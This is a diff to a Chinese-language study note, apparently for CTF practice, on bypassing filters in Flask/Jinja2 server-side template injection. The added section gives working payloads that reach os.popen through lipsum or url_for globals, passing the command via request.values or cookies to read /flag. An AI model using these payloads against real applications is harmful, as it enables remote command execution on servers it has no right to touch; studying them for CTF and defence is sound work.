@@ -112,7 +112,7 @@ Flask内置函数和内置对象可以通过{{self.__dict__._TemplateReference__
 
 ^
 ^
-## **绕过基础**
+## **点._绕过**
 单引号'被过滤可以用双引号"代替；
 
 至于点.和下划线_被过滤可以采用16进制来表示，用的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
@@ -170,3 +170,17 @@ array[0]
 array.pop(0)
 ```
 
+
+^
+## **请求参数args过滤绕过**
+1、不用args，通过value获取所有参数。
+```
+?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
+```
+2、通过cookie
+```
+?name={{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}
+
+cookie传参：
+a=os;b=popen;c=cat /flag
+```
